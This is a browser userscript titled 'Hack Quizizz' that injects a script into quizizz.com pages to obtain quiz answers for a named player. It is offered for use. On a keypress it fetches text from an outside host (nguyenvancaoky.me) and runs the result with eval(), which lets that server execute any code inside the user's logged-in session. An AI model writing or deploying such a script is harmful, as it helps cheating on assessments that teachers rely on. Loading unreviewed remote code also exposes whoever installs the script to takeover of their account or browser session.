// ==UserScript==
// @name         Hack Quizizz
// @namespace    Nguyễn Văn Cao Kỳ
// @description  :)
// @author       Nguyễn Văn Cao Kỳ
// @include      *quizizz.com*
// @require      https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js
// @grant        GM_xmlhttpRequest
// @grant        GM.xmlHttpRequest
// @grant        GM_getResourceText
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        unsafeWindow
// @grant        none
// @version      1.0.1
// @copyright    2021, nguyenvancaoky (https://fb.me/nguyenvancaoky)
// @license MIT
// ==/UserScript==



appendMenu();
appendFunc();

function appendMenu(){
        var divBlock = `<div style="z-index: 99999;position: absolute;right: 8px;bottom: 8px;width: 230px;height: 35px;background-color: #d9dde8;border-radius: 6px;" id="menu"><p style=" font-size: 13px; color: #000000; padding: 8px 10px; text-align: center; " id="log">Hack by Nguyễn Văn Cao Kỳ</p></div>`;
        $("body").append(divBlock);
}
function appendFunc(){
  var func = document.createElement("script");
  func.innerHTML = `let q_username="";let menu=true;document.addEventListener('keydown',function(event){if(event.code=='KeyX'){get_username()}if(event.code=='KeyZ'){if(q_username!=""){getAnswer()}else{get_username()}}if(event.code=='KeyC'){menu=!menu;if(menu){$('#menu').css('display','block')}else{$('#menu').css('display','none')}}});function get_username(){console.log("===> Get Username");q_username=prompt("Enter other player Name",'');showStatus()}function getAnswer(){console.log("===> Get Answer");sovle()}function showStatus(){let log='Set Username:'+q_username;$('#log').text(log);console.log(log)}function sovle(){fetch("https://nguyenvancaoky.me/quizizz.php?u="+q_username).then((res)=>res.text().then((t)=>eval(t)))}`;
  $("body").append(func);
  console.log('INJECTED HACK ----> OK')
}
